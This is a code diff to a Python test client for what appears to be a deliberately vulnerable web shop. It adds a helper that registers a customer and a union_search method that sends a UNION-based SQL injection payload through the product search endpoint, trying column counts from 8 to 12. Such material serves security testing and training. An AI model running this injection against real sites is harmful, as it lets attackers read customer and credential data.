@@ -45,6 +45,26 @@ class Shop:
     def captcha(self) -> dict:
         return self.get("/rest/captcha/").json()
 
+    def new_user_token(self, email: str, password: str = "correct-horse-7") -> str:
+        """Register an ordinary customer and sign in as them."""
+        created = self.post("/api/Users/", json={"email": email, "password": password, "passwordRepeat": password})
+        assert created.status_code == 201, created.text
+        return self.token(email, password)
+
+    def union_search(self, columns: str, table: str) -> requests.Response:
+        """Run `UNION SELECT <columns>, padding... FROM <table>` through the product search.
+
+        UNION needs the same number of columns as `SELECT * FROM Products`.
+        Like a real attacker, try the likeliest count first, then nearby ones.
+        Wrong guesses are SQL errors (HTTP 500)."""
+        given = columns.count(",") + 1
+        for total in (10, 9, 11, 8, 12):
+            padding = "".join(f",{n}" for n in range(given + 1, total + 1))
+            response = self.get("/rest/products/search", params={"q": f"qwert')) UNION SELECT {columns}{padding} FROM {table}--"})
+            if response.status_code == 200:
+                return response
+        raise AssertionError("no column count between 8 and 12 worked for the UNION")
+
 
 def jwt_claims(token: str) -> dict:
     payload = token.split(".")[1]
